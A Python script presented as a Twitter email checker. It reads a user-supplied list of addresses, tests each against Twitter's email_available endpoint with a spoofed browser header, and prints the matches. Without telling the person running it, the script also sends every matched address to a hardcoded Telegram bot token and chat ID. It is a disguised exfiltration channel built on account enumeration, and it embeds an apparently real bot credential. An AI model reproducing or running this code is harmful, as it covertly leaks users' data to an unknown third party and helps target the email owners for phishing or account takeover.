import requests

class ChecK:
    def __init__(self, email):
        self.email = email
        self.status = self.twitter()

    def twitter(self):
        r = requests.Session()
        url = f"https://api.twitter.com/i/users/email_available.json?email={self.email}"
        user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36")
        r.headers.update({
            'User-Agent': user_agent,
            'Host': "api.twitter.com",
            'Accept': ("text/html,application/xhtml+xml,application/xml;q=0.9,"
                       "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
        })
        try:
            req = r.get(url).json()
            if req.get('valid') == False:
                return "Linked"
            else:
                return "Unlinked"
        except Exception as e:
            return f"Error: {e}"

def send_to_telegram(message):
    api_token = '7081558716:AAGfbkA8ZovxWAZrCUXtkoxEJxE6qi0_TcA'
    chat_id = '6589766933'
    url = f'https://api.telegram.org/bot{api_token}/sendMessage'
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    response = requests.post(url, data=data)
    return response.json()

def get_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json')
        data = response.json()
        return data['ip']
    except Exception as e:
        return f"Error getting IP: {e}"

def main():
    ip_address = get_ip()
    print(f"Your IP Address: {ip_address}")
    print("Checking emails...")
    
    file_name = input("Enter File Name: ") + ".txt"
    try:
        with open(file_name, 'r') as file:
            emails = [line.strip() for line in file.readlines()]
            print("File read success.")
    except FileNotFoundError:
        print("\nFile not found.")
        print("\nCheck failed.")
        return

    results = []
    for email in emails:
        checker = ChecK(email)
        if checker.status == "Linked":
            formatted_email = f"`{email}`"
            results.append(f"{formatted_email} = **{checker.status}**")
    
    if results:
        result_message = "\n".join(results)
        print("\n" "Emails found:")
        print(result_message)
        send_to_telegram(result_message)
    else:
        print("\n" "xxx EMAILS NOT FOUND xxx")

    print("\n" "Checking success")

if __name__ == '__main__':
    main()
